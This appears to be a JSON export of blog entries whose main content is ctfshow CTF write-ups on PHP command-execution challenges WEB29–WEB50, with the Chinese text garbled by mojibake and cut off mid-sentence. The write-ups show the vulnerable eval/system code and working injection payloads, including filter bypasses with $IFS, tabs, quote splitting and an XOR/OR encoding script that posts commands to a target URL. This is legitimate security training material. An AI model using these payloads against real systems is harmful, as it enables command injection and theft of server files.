[{"content":"é˜¿ä¼Ÿä½ åˆåœ¨æ‰“ç”µåŠ¨å–”ï¼Œä¼‘æ¯ä¸€ä¸‹å§ï¼Œå»çœ‹çœ‹ä¹¦å¥½ä¸å¥½\n","date":"2025-03-18T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/fivechessv1/","title":"äº”å­æ£‹"},{"content":"CTFSHOW web å‘½ä»¤æ‰§è¡ŒWriteUP Part2 WEB41 è¿‡æ»¤ä¸ä¸¥ï¼Œå‘½ä»¤æ‰§è¡Œ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: ç¾½ # @Date: 2020-09-05 20:31:22 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:40:07 # @email: 1341963450@qq.com # @link: https://ctf.show */ if(isset($_POST[\u0026#39;c\u0026#39;])){ $c = $_POST[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#39;/[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026amp;|\\-/i\u0026#39;, $c)){ eval(\u0026#34;echo($c);\u0026#34;); } }else{ highlight_file(__FILE__); } ?\u0026gt; è¿™æ¬¡æ²¡æœ‰æ€è·¯äº†ï¼Œçœ‹ç¾½å¸ˆå‚…å†™çš„ç¨‹åºåˆ†æäº†ä¸€ä¸‹ï¼Œå¤§ä½“æ„æ€å°±æ˜¯ä»è¿›è¡Œå¼‚æˆ–çš„å­—ç¬¦ä¸­æ’é™¤æ‰è¢«è¿‡æ»¤çš„ï¼Œç„¶ååœ¨åˆ¤æ–­å¼‚æˆ–å¾—åˆ°çš„å­—ç¬¦æ˜¯å¦ä¸ºå¯è§å­—ç¬¦ ç¾½å¸ˆå‚…å…ˆæŠŠæˆ–è¿ç®—çš„ç»“æœæ”¾è¿›txtï¼Œç„¶åæŸ¥è¡¨æ„é€ payloadï¼Œç”¨äº†ä¸¤ä¸ªè„šæœ¬ï¼Œè¿™é‡Œç»™ä¸€ä¸ªä¸€ä½“åŒ–çš„è„šæœ¬ï¼Œç›´æ¥è¾“å…¥urlå¯ä»¥ç›´æ¥è·å–æ‰§è¡Œç»“æœ\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 import re import urllib from urllib import parse import requests contents = [] for i in range(256): for j in range(256): hex_i = \u0026#39;{:02x}\u0026#39;.format(i) hex_j = \u0026#39;{:02x}\u0026#39;.format(j) preg = re.compile(r\u0026#39;[0-9]|[a-z]|\\^|\\+|~|\\$|\\[|]|\\{|}|\u0026amp;|-\u0026#39;, re.I) if preg.search(chr(int(hex_i, 16))) or preg.search(chr(int(hex_j, 16))): continue else: a = \u0026#39;%\u0026#39; + hex_i b = \u0026#39;%\u0026#39; + hex_j c = chr(int(a[1:], 16) | int(b[1:], 16)) if 32 \u0026lt;= ord(c) \u0026lt;= 126: contents.append([c, a, b]) def make_payload(cmd): payload1 = \u0026#39;\u0026#39; payload2 = \u0026#39;\u0026#39; for i in cmd: for j in contents: if i == j[0]: payload1 += j[1] payload2 += j[2] break payload = \u0026#39;(\u0026#34;\u0026#39; + payload1 + \u0026#39;\u0026#34;|\u0026#34;\u0026#39; + payload2 + \u0026#39;\u0026#34;)\u0026#39; return payload URL = input(\u0026#39;url:\u0026#39;) payload = make_payload(\u0026#39;system\u0026#39;) + make_payload(\u0026#39;cat flag.php\u0026#39;) response = requests.post(URL, data={\u0026#39;c\u0026#39;: urllib.parse.unquote(payload)}) print(response.text) WEB42 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 20:51:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); }else{ highlight_file(__FILE__); } Linus Benedict Torvalds åœ¨/dev/nullèµ°äº†ä¸€åœˆ,ç„¶åå›æ¥äº†ã€‚\nè¿™é“é¢˜ä¼šæŠŠå›æ˜¾ä¸¢å¼ƒï¼Œä¸è¿‡ç”±äºå¹¶ä¸å½±å“ä¼ å‚è¿‡ç¨‹ï¼Œç›´æ¥ä¼ å‚?c=cp flag.php 1.txtç„¶åè®¿é—®url/1.txtå°±ç›´æ¥è·å–flagäº†ï¼Œä¸‹é¢å†ä»‹ç»ä¸€äº›å…¶ä»–çš„æ–¹æ³•ï¼Œå¯ä»¥å‚è€ƒä¸€ä¸‹ï¼š\nä½¿ç”¨ \u0026quot; ; \u0026quot; \u0026quot; || \u0026quot; \u0026quot; \u0026amp; \u0026quot; \u0026quot; \u0026amp;\u0026amp; \u0026quot; åˆ†éš”\n/dev/null 2\u0026gt;\u0026amp;1 æ„æ€æ˜¯å°†æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯éƒ½é‡å®šå‘åˆ° /dev/null å³ä¸å›æ˜¾ ; //åˆ†å· | //åªæ‰§è¡Œåé¢é‚£æ¡å‘½ä»¤ || //åªæ‰§è¡Œå‰é¢é‚£æ¡å‘½ä»¤ \u0026amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ \u0026amp;\u0026amp; //ä¸¤æ¡å‘½ä»¤éƒ½ä¼šæ‰§è¡Œ\nå¯æ„é€ playload: url/?c=tac flag.php|| url/?c=tac flag.php%26 æ³¨æ„ï¼Œè¿™é‡Œçš„\u0026amp;éœ€è¦urlç¼–ç \nWEB43 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜ç›¸æ¯”WEB42ä»…ä»…å¤šäº†ä¸€å±‚è¿‡æ»¤catæŒ‡ä»¤å’Œåˆ†å·ï¼Œä½¿ç”¨ä¸Šä¸€é¢˜æˆ‘çš„cpä¼ å‚ä»ç„¶æœ‰æ•ˆï¼ŒåŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨\u0026amp;\u0026amp; ||ç­‰ç­‰ï¼Œè¿™é‡Œä¸è¯¦ç»†è§£é‡Šäº†\nWEB44 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:01 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/;|cat|flag/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } ä¸ç”¨å¤šè§£é‡Šå•¥äº†ï¼Œåªæ˜¯å¤šäº†ä¸ªè¿‡æ»¤flagå…³é”®å­—è€Œå·²ï¼Œç›´æ¥cp f* 1.txt æˆ–è€…\u0026hellip;tac f*ç­‰ç­‰ç­‰ç­‰ç­‰éƒ½å¯ä»¥çš„\nWEB45 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:35:34 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| /i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™æ¬¡æŠŠç©ºæ ¼ä¹Ÿç»™è¿‡æ»¤äº†ï¼Œäºæ˜¯éœ€è¦payloadæŠŠç©ºæ ¼æ›¿æ¢æ‰ï¼Œä¾‹å¦‚ï¼š\nä½¿ç”¨Tabé”®ï¼ˆ%09ï¼‰ ä½¿ç”¨æ¢è¡Œç¬¦ï¼ˆ%0aï¼‰ ä½¿ç”¨$IFSå˜é‡ï¼ˆLinuxç³»ç»Ÿä¸­çš„å†…éƒ¨å˜é‡ï¼Œè¡¨ç¤ºåˆ†éš”ç¬¦ï¼‰ ä½¿ç”¨\u0026lt;ï¼ˆé‡å®šå‘ç¬¦ï¼‰ æ„é€ payloadï¼š\n1 ?c=cp$IFS\u0026#39;f\u0026#39;*$IFS\u0026#39;1.txt\u0026#39; è®¿é—®1.txtå³å¯è·å–flagã€‚\næˆ–è€…ä¹Ÿå¯ä»¥æ„é€ è¿™æ ·çš„payloadæŠµæ¶ˆæ‰åé¢çš„\u0026gt;/dev/nullä¸€æ­¥å®Œæˆï¼š\n1 2 3 ?c=tac%09f*.php|| ?c=tac$IFS$f*|| ?c=tac$IFS$f*%26 *å¿…é¡»ç”¨%26è€Œä¸èƒ½ç”¨\u0026amp;\nWEB46 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜è¿‡æ»¤äº†ç©ºæ ¼ï¼Œæ‰€æœ‰æ•°å­—ä»¥åŠ$å’Œ*ï¼Œæ€ä¹ˆåŠå‘¢ï¼Ÿ\næˆ‘ä»¬åœ¨shellåšäº†ä¸ªå®éªŒï¼š\n1 2 root@hcss-ecs-b1d9:~# c\u0026#39;\u0026#39;at fl\u0026#39;\u0026#39;ag falg{1s_n0t_h3r3} å¯ä»¥å‘ç°''ä¼šè¢«å¿½ç•¥å¹¶è¾“å‡ºåŸæœ¬çš„å‘½ä»¤å†…å®¹ 'çš„ç½‘é¡µç¼–ç ä¸º%27\næˆ‘ä»¬å¯ä»¥æ ¹æ®è¿™ä¸ªåŸç†æ„é€ payloadï¼š\n1 ?c=tac%09fl%27%27ag.php|| è¿™é‡Œçš„æ•°å­—ä¼šè¢«è½¬è¯‘ä¸ºç¬¦å·ï¼Œä¸ä¼šè¢«è¿‡æ»¤ï¼Œç›´æ¥ä¼ å‚å³å¯ã€‚\nå¦å¤–?å¯ä»¥ä»£æ›¿*ï¼Œ?æŒ‡ä»£ä¸€ä¸ªå­—ç¬¦ä½ã€‚\nWEB47 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:59:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } å’Œä¸Šé¢˜åŸºæœ¬ä¸€æ ·ï¼Œåªæ˜¯å¤šè¿‡æ»¤äº†ä¸€äº›è¾“å‡ºæ–‡ä»¶çš„å…³é”®è¯ï¼Œä½†æ˜¯å¹¶ä¸å½±å“æˆ‘ä»¬ä¸Šé¢˜payloadçš„æ€è·¯\nä¸è¿‡è¿™é“é¢˜ä¹Ÿèƒ½è®©æˆ‘ä»¬æ›´åŠ äº†è§£ç»ˆç«¯è¾“å‡ºæ–‡ä»¶å†…å®¹çš„ä¸€äº›æ–°çš„æ–¹æ³•ï¼Œå¯ä»¥ç§¯ç´¯ä¸€ä¸‹ã€‚\nWEB48 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:06:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } åŒä¸Šé¢˜ç›®ï¼Œå¤šè¿‡æ»¤äº†ä¸€äº›å¯ä»¥åˆ©ç”¨çš„payloadï¼Œä½†æ˜¯å•å¼•å·ä»ç„¶å¯ä»¥ä½¿ç”¨ï¼Œä¸‹é¢ç®€å•ä»‹ç»ä¸€äº›è¿™é‡Œä¸€äº›å‘½ä»¤çš„ä½¿ç”¨æ–¹æ³•ï¼š\nä¸€äº›æ–‡ä»¶å†…å®¹æŸ¥çœ‹å‘½ä»¤çš„åˆ©ç”¨æ–¹å¼ moreï¼šåˆ†é¡µæ˜¾ç¤ºæ–‡ä»¶å†…å®¹\n1 more flag.php # åˆ†é¡µæ˜¾ç¤ºflag.phpçš„å†…å®¹ lessï¼šä¸moreç±»ä¼¼ï¼Œä½†åŠŸèƒ½æ›´å¼ºå¤§ï¼Œå¯ä»¥å‘å‰ç¿»é¡µ\n1 less flag.php # äº¤äº’å¼æŸ¥çœ‹flag.php headï¼šæ˜¾ç¤ºæ–‡ä»¶å¼€å¤´éƒ¨åˆ†\n1 2 head flag.php # é»˜è®¤æ˜¾ç¤ºå‰10è¡Œ head -n 5 flag.php # æ˜¾ç¤ºå‰5è¡Œ tailï¼šæ˜¾ç¤ºæ–‡ä»¶ç»“å°¾éƒ¨åˆ†\n1 2 tail flag.php # é»˜è®¤æ˜¾ç¤ºæœ€å10è¡Œ tail -n 3 flag.php # æ˜¾ç¤ºæœ€å3è¡Œ sortï¼šå¯¹æ–‡ä»¶å†…å®¹è¿›è¡Œæ’åºæ˜¾ç¤º\n1 sort flag.php # æŒ‰å­—æ¯é¡ºåºæ’åºæ˜¾ç¤º sedï¼šæµç¼–è¾‘å™¨ï¼Œå¯ä»¥å¯¹æ–‡æœ¬è¿›è¡Œæ›¿æ¢ã€åˆ é™¤ç­‰æ“ä½œ\n1 2 sed \u0026#39;s/password/PASSWORD/g\u0026#39; flag.php # æ›¿æ¢æ‰€æœ‰passwordä¸ºPASSWORDå¹¶æ˜¾ç¤º sed -n \u0026#39;5p\u0026#39; flag.php # åªæ˜¾ç¤ºç¬¬5è¡Œ cutï¼šå‰ªåˆ‡æ–‡ä»¶çš„ä¸€éƒ¨åˆ†å†…å®¹\n1 cut -d \u0026#34;:\u0026#34; -f 1 flag.php # ä»¥å†’å·ä¸ºåˆ†éš”ç¬¦ï¼Œæ˜¾ç¤ºç¬¬1ä¸ªå­—æ®µ awkï¼šå¼ºå¤§çš„æ–‡æœ¬å¤„ç†å·¥å…·\n1 2 awk \u0026#39;{print $1}\u0026#39; flag.php # æ‰“å°æ¯è¡Œçš„ç¬¬ä¸€ä¸ªå­—æ®µ awk \u0026#39;/flag/{print}\u0026#39; flag.php # æ‰“å°åŒ…å«\u0026#34;flag\u0026#34;çš„è¡Œ stringsï¼šæå–æ–‡ä»¶ä¸­çš„å¯æ‰“å°å­—ç¬¦ä¸²\n1 strings flag.php # æ˜¾ç¤ºflag.phpä¸­çš„æ‰€æœ‰å¯æ‰“å°å­—ç¬¦ä¸² odï¼šå…«è¿›åˆ¶è½¬å‚¨ï¼Œå¯ä»¥æŸ¥çœ‹äºŒè¿›åˆ¶æ–‡ä»¶\n1 2 od -c flag.php # ä»¥å­—ç¬¦å½¢å¼æ˜¾ç¤ºæ–‡ä»¶å†…å®¹ od -x flag.php # ä»¥åå…­è¿›åˆ¶å½¢å¼æ˜¾ç¤º curlï¼šç½‘ç»œä¼ è¾“å·¥å…·\n1 2 curl http://example.com/flag.php # è·å–è¿œç¨‹æ–‡ä»¶å†…å®¹ curl -o local.txt http://example.com/flag.php # ä¸‹è½½åˆ°æœ¬åœ° åå¼•å· `ï¼šå‘½ä»¤æ›¿æ¢ï¼Œæ‰§è¡Œå‘½ä»¤å¹¶è¿”å›ç»“æœ\n1 echo `cat flag.php` # æ‰§è¡Œcat flag.phpå¹¶å°†ç»“æœä¼ ç»™echo tacå‘½ä»¤ï¼ˆåå‘catï¼‰ï¼š\n1 tac flag.php nlå‘½ä»¤ï¼ˆå¸¦è¡Œå·æ˜¾ç¤ºï¼‰ï¼š 1 nl flag.php grepå‘½ä»¤ï¼š 1 2 grep \u0026#39;\u0026#39; flag.php # æ˜¾ç¤ºæ‰€æœ‰è¡Œ grep -v \u0026#34;ä¸å­˜åœ¨çš„å­—ç¬¦ä¸²\u0026#34; flag.php # æ˜¾ç¤ºä¸åŒ…å«æŒ‡å®šå­—ç¬¦ä¸²çš„è¡Œï¼ˆå³æ‰€æœ‰è¡Œï¼‰ revå‘½ä»¤ï¼ˆå…ˆåè½¬å†åè½¬å›æ¥ï¼‰ï¼š 1 rev flag.php|rev base64ç¼–ç ï¼š 1 2 base64 flag.php # ç„¶ååœ¨æœ¬åœ°è§£ç  hexdumpï¼š 1 hexdump -C flag.php findå‘½ä»¤çš„-execé€‰é¡¹ï¼š 1 find flag.php -exec cat {} \\; whileå¾ªç¯è¯»å–ï¼š 1 while read line;do echo $line;done\u0026lt;flag.php WEB49 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:22:43 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é“é¢˜ä¹ä¸€çœ‹æŠŠå’±ä»¬çš„%è½¬ä¹‰ç¬¦å·ç»™å¹²æ‰äº†ï¼Œä½†æ˜¯å®é™…ä¸Šå¹¶æ²¡æœ‰ï¼Œä¼ å‚åˆ°è¿™é‡Œä»¥åæ—©å°±è‡ªåŠ¨è½¬ä¸ºç¬¦å·äº†ï¼Œæ‰€ä»¥ä¾ç„¶å¯ä»¥ä½¿ç”¨%xxè½¬ä¹‰æ¥å†™payloadï¼ŒWEB46çš„payloadåœ¨è¿™é‡Œä»ç„¶å¯ç”¨ã€‚\nWEB50 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 \u0026lt;?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:32:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET[\u0026#39;c\u0026#39;])){ $c=$_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\u0026#34;, $c)){ system($c.\u0026#34; \u0026gt;/dev/null 2\u0026gt;\u0026amp;1\u0026#34;); } }else{ highlight_file(__FILE__); } è¿™é‡Œ%09è¢«è¿‡æ»¤äº†ï¼Œå¯ä»¥æ¢æˆ\u0026lt;è¿™ç§ä¸éœ€è¦ç©ºæ ¼çš„è¯ã€‚\n1 ?c=tac\u0026lt;fl%27%27ag.php|| æ€»ç»“ åœ¨è¿™ä¸€ç³»åˆ—çš„CTFæŒ‘æˆ˜ä¸­ï¼Œæˆ‘ä»¬æ¢ç´¢äº†å„ç§å‘½ä»¤æ‰§è¡Œç»•è¿‡æŠ€å·§ï¼Œä»ç®€å•çš„è¿‡æ»¤åˆ°å¤æ‚çš„å¤šé‡è¿‡æ»¤ã€‚ä»¥ä¸‹æ˜¯æˆ‘ä»¬å­¦åˆ°çš„ä¸»è¦æŠ€æœ¯ï¼š\nç©ºæ ¼ç»•è¿‡ï¼š\nä½¿ç”¨Tabé”®ï¼ˆ%09ï¼‰ ä½¿ç”¨$IFSå˜é‡ ä½¿ç”¨é‡å®šå‘ç¬¦å·\u0026lt; ä½¿ç”¨å•å¼•å·\u0026rsquo;\u0026lsquo;åˆ†éš” å…³é”®å­—ç»•è¿‡ï¼š\nä½¿ç”¨å•å¼•å·åˆ†å‰²å…³é”®å­—ï¼ˆå¦‚c\u0026rsquo;\u0026lsquo;atï¼‰ ä½¿ç”¨é€šé…ç¬¦ï¼ˆ*å’Œ?ï¼‰æ›¿ä»£å®Œæ•´æ–‡ä»¶å ä½¿ç”¨æ›¿ä»£å‘½ä»¤ï¼ˆtacä»£æ›¿catï¼‰ ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼š\nURLç¼–ç ï¼ˆå¦‚%26ä»£æ›¿\u0026amp;ï¼‰ ä½¿ç”¨||ã€\u0026amp;ã€\u0026amp;\u0026amp;ç­‰é€»è¾‘è¿ç®—ç¬¦åˆ†éš”å‘½ä»¤ è¾“å‡ºé‡å®šå‘ç»•è¿‡ï¼š\nä½¿ç”¨||ã€\u0026amp;ç­‰è¿ç®—ç¬¦æŠµæ¶ˆ\u0026gt;/dev/nullçš„æ•ˆæœ æ–‡ä»¶å†…å®¹æŸ¥çœ‹çš„å¤šç§æ–¹æ³•ï¼š\né™¤äº†å¸¸è§çš„catï¼Œè¿˜æœ‰tacã€nlã€grepã€revç­‰å¤šç§å‘½ä»¤ ä½¿ç”¨base64ç¼–ç ååœ¨æœ¬åœ°è§£ç  è¿™äº›æŠ€å·§ä¸ä»…é€‚ç”¨äºCTFæ¯”èµ›ï¼Œä¹Ÿå¯¹ç†è§£Webå®‰å…¨ä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´é˜²æŠ¤æœ‰é‡è¦æ„ä¹‰ã€‚é€šè¿‡å­¦ä¹ è¿™äº›ç»•è¿‡æŠ€æœ¯ï¼Œæˆ‘ä»¬èƒ½æ›´å¥½åœ°ç†è§£å¦‚ä½•æ„å»ºå®‰å…¨çš„Webåº”ç”¨ï¼Œé˜²æ­¢å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚\nç»“è¯­\nå‘½ä»¤æ‰§è¡Œæ¼æ´æ˜¯Webå®‰å…¨ä¸­çš„ä¸€ä¸ªé‡è¦æ–¹é¢ï¼Œé€šè¿‡è¿™ç³»åˆ—çš„CTFæŒ‘æˆ˜ï¼Œæˆ‘ä»¬ä¸ä»…å­¦ä¹ äº†å¦‚ä½•åˆ©ç”¨è¿™äº›æ¼æ´ï¼Œæ›´é‡è¦çš„æ˜¯ç†è§£äº†å¦‚ä½•é˜²å¾¡å®ƒä»¬ã€‚å®‰å…¨ä¸æ˜¯ä¸€æˆä¸å˜çš„ï¼Œæ”»å‡»è€…æ€»æ˜¯èƒ½æ‰¾åˆ°æ–°çš„ç»•è¿‡æ–¹æ³•ï¼Œå› æ­¤é˜²å¾¡è€…éœ€è¦ä¸æ–­å­¦ä¹ å’Œæ›´æ–°çŸ¥è¯†ã€‚\n","date":"2025-03-17T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/ctfshow_web_command_write_up_2/","title":"CTF_show Web å‘½ä»¤æ‰§è¡Œwriteup P2 WEB41-WEB50"},{"content":"æ–°å¹´å¿«ä¹ï¼\n","date":"2025-01-23T00:00:00Z","permalink":"https://blog.kingbatsoft.top/p/happy_new_year_2025/","title":"2025æ–°å¹´å¿«ä¹~"},{"content":"CTFSHOW web å‘½ä»¤æ‰§è¡ŒWriteUP Part1 WEB29-WEB40 WEB29 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\nè¿™é‡Œçœ‹åˆ°ç”¨cä¼ å‚ï¼Œåšäº†ä¸€ç‚¹ç®€å•è¿‡æ»¤ ä¸è¿‡è¿™ç‚¹ä¸œè¥¿æ€ä¹ˆèƒ½éš¾å€’æˆ‘ï¼Œå“¼\n1 2 æ–¹æ³•1 c=system(\u0026#34;cp fl*g.php 123.txt\u0026#34;); è®¿é—®123.txtå³å¯ æ–¹æ³•2 c=system(\u0026#34;tac fl*g.php\u0026#34;) å½“ç„¶è¿™é“é¢˜æ–¹æ³•å¤ªå¤šäº†ï¼Œä¸å†ä¸¾ä¾‹å­äº†\nWEB30 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤\nè¿™é“é¢˜çœ‹æè¿°å’Œä¸Šä¸€é“é¢˜ä¸€æ ·ï¼Œä¸è¿‡ä»£ç è¿‡æ»¤ç›¸å¯¹æ›´åŠ ä¸¥æ ¼äº†ä¸€äº›\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } å¯ä»¥çœ‹å‡ºè¿‡æ»¤äº†flag system phpè¿™äº›å¸¸ç”¨çš„æŒ‡ä»¤å’Œä¸flagæœ‰å…³çš„å†…å®¹ï¼Œä½†æ˜¯execï¼Œpassthruç­‰æŒ‡ä»¤ä»ç„¶æ²¡è¢«è¿‡æ»¤\nç›´æ¥æ•…æŠ€é‡æ–½ï¼š\n1 ?c=echo exec(\u0026#34;cp fl*g.ph* 1.txt\u0026#34;); è®¿é—®url/1.txtç›´æ¥å¾—åˆ°flag\né™„ï¼šphpæ‰§è¡Œç³»ç»ŸæŒ‡ä»¤ç›¸å…³èŠå£«\nWEB31 å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦ä¸¥æ ¼çš„è¿‡æ»¤ è¿™é“é¢˜ä»ç„¶çƒ¤å‘½ä»¤è¿‡æ»¤ï¼Œæ‰“å¼€é¢˜çœ‹ä¸€çœ¼å…ˆ\n1 2 3 4 5 6 7 8 9 10 error_reporting(0); if(isset($_GET[\u0026#39;c\u0026#39;])){ $c = $_GET[\u0026#39;c\u0026#39;]; if(!preg_match(\u0026#34;/flag|system|php|cat|sort|shell|\\.| |\\\u0026#39;/i\u0026#34;, $c)){ eval($c); } }else{ highlight_file(__FILE__); } å¥½å®¶ä¼™ï¼Œè¿™æ¬¡è¿‡æ»¤äº†è¿™ä¹ˆå¤šï¼Œç”šè‡³è¿ç©ºæ ¼éƒ½ç»™è¿‡æ»¤äº†ï¼Œæ€ä¹ˆåŠå‘¢ï¼Œè¿™é‡Œå·çœ‹äº†wpï¼Œå¤§æ¦‚æœ‰ä¸‰ç§æ–¹æ³•ï¼š\n1.å¯ä»¥æ„é€ ä¸€ä¸ªæ–°å‡½æ•° ä¾‹c=eval($_GET[a]);\u0026amp;a=system('cat flag.php');å› ä¸ºåªåˆ¤æ–­äº†ä¼ å…¥çš„cçš„å€¼ï¼Œç›´æ¥æ–°å»ºä¸€ä¸ªå˜é‡ç›´æ¥ç»•è¿‡ï¼Œè¿™ç§æ–¹æ³•ä¹Ÿé€‚ç”¨äºä¸Šé¢ä¸¤ç§\n2.å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„å…¶ä»–å‡½æ•°æ¥å‡‘å‡ºæ‰€éœ€è¦çš„å­—ç¬¦ä¸²æ¥ç»•è¿‡ c=show_source(next(array_reverse(scandir(pos(localeconv()))))); åè¯è§£é‡Šï¼š\nlocaleconv()ï¼šè¿”å›åŒ…å«æœ¬åœ°åŒ–æ•°å­—å’Œè´§å¸æ 